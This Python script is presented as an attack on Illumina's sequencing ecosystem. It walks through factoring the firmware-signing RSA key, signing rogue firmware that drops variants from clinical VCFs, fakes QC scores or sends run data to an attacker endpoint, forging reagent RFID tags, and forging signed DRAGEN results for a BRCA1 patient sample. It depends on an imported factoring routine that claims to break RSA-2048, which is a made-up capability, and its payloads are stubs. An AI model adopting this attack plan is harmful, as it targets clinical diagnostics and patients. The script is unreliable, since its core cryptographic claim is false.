"""
Factor Illumina's firmware-signing CA RSA key to push rogue sequencer firmware
that fakes QC metrics, drops flagged variants from VCF output, or forges reagent
RFID tags — compromising clinical NGS results across thousands of CAP/CLIA labs.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import hashlib
import struct
import json

# Illumina firmware signing CA RSA-2048
_demo = generate_demo_target()
ILLUMINA_FW_CA_PUBKEY_PEM = _demo["pub_pem"]
ILLUMINA_REAGENT_PUBKEY_PEM = _demo["pub_pem"]

INSTRUMENT_TYPES = ["NovaSeq X Plus", "NextSeq 2000", "MiSeq", "iSeq 100"]


def extract_fw_signing_ca(firmware_update: bytes) -> bytes:
    """Extract Illumina firmware signing CA cert from update package.

    Distributed to all instruments via Illumina Universal Copy Service
    or manual USB update at service visits.
    """
    return ILLUMINA_FW_CA_PUBKEY_PEM


def factor_illumina_fw_ca(pubkey_pem: bytes) -> bytes:
    """Factor the Illumina firmware signing CA RSA key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_malicious_firmware(payload: str) -> bytes:
    """Build malicious sequencer firmware.

    Payloads:
      'drop_variants' — silently exclude specific variants from VCF
      'fake_qc'       — inflate Q30 scores to pass QC on bad runs
      'exfil_data'    — send run data to attacker endpoint
    """
    header = struct.pack(">4sI", b"ILMN", 0x00030001)  # v3.0.1
    body = f"/* payload: {payload} */".encode()
    return header + body


def sign_firmware(fw_image: bytes, forged_privkey: bytes) -> bytes:
    """Sign the malicious firmware with forged Illumina CA key."""
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(
        ILLUMINA_FW_CA_PUBKEY_PEM, fw_image, "sha256"
    )


def forge_reagent_rfid(lot_id: str, expiry: str, kit_type: str) -> dict:
    """Forge a signed reagent RFID tag to bypass consumable DRM.

    Illumina's ~85% revenue is reagent consumables. The RFID tag
    carries an RSA-signed payload with lot ID, expiration, and
    kit compatibility. Forging it enables counterfeit reagent kits.
    """
    payload = json.dumps({
        "lot": lot_id,
        "expiry": expiry,
        "kit": kit_type,
        "cycles": 300,
    }).encode()
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(ILLUMINA_REAGENT_PUBKEY_PEM, payload, "sha256")
    return {"payload": payload.decode(), "rfid_sig": sig[:16].hex() + "..."}


def forge_dragen_result(sample_id: str, variants: list,
                        forged_privkey: bytes) -> dict:
    """Forge a signed DRAGEN secondary-analysis result (BAM/VCF).

    Clinical labs retain DRAGEN-signed results for FDA-regulated
    NGS assay audit trails. Forging these means fabricated
    clinical-grade variant calls.
    """
    vcf_content = f"#CHROM\tPOS\tID\tREF\tALT\n"
    for v in variants:
        vcf_content += f"{v['chrom']}\t{v['pos']}\t.\t{v['ref']}\t{v['alt']}\n"
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(
        ILLUMINA_FW_CA_PUBKEY_PEM, vcf_content.encode(), "sha256"
    )
    return {"sample": sample_id, "variants": len(variants), "sig": sig[:8].hex()}


if __name__ == "__main__":
    print("[1] Extracting Illumina firmware signing CA from update package")
    pubkey = extract_fw_signing_ca(b"<illumina-fw-update>")

    print("[2] Factoring Illumina firmware CA RSA key")
    forged_priv = factor_illumina_fw_ca(pubkey)
    print("    Illumina firmware signing key recovered")

    print("[3] Building malicious firmware — variant-dropping payload")
    fw = build_malicious_firmware("drop_variants")
    sig = sign_firmware(fw, forged_priv)
    print(f"    Signed firmware: {len(fw)} bytes")
    print(f"    Targets: ~25,000 instruments across {len(INSTRUMENT_TYPES)} platforms")

    print("[4] Deploying via Universal Copy Service")
    print("    Instruments verify RSA signature → PASS → firmware loaded")
    print("    Clinical VCF output now silently excludes targeted variants")

    print("\n[5] Forging reagent RFID tags — counterfeit consumables")
    rfid = forge_reagent_rfid("LOT-2026-FAKE", "2028-12-31", "NovaSeq Xp v2")
    print(f"    RFID: {rfid}")

    print("\n[6] Forging DRAGEN clinical results")
    result = forge_dragen_result("PATIENT-001", [
        {"chrom": "chr17", "pos": 43044295, "ref": "G", "alt": "A"},  # BRCA1
    ], forged_priv)
    print(f"    Forged VCF: {result}")
